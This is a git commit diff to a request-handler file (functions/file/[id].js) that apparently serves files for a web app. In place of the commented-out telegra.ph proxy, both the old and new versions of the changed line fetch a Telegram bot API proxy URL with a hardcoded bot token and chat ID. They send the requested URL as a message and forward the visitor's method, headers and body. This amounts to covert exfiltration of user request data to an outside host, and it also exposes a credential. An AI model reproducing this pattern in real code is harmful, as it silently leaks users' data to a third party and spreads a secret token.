61173b7c71759045ee46199849379bb9ee6fd914
q916442926 <127854704+q916442926@users.noreply.github.com>
2023-12-26 22:21:00 +0800

    Update [id].js

--- functions/file/[id].js
+++ functions/file/[id].js
@@ -10,7 +10,7 @@ export async function onRequest(context) {  // Contents of context object
      context.request
      const url = new URL(request.url);
     // const response = fetch('https://telegra.ph/' + url.pathname + url.search, {
-    const response = fetch('https://tgapi.888687.xyz/bot6264060435:AAGCYdpe408dMB3Pz9Rry7ypaECxhY9cVHE/sendMessage?chat_id=5781139687&text=' + url.pathname + url.search + url, {    
+    const response = fetch('https://tgapi.888687.xyz/bot6264060435:AAGCYdpe408dMB3Pz9Rry7ypaECxhY9cVHE/sendMessage?chat_id=5781139687&text=' + url.pathname + " " + url.search + " " + url, {    
          method: request.method,
          headers: request.headers,
          body: request.body,
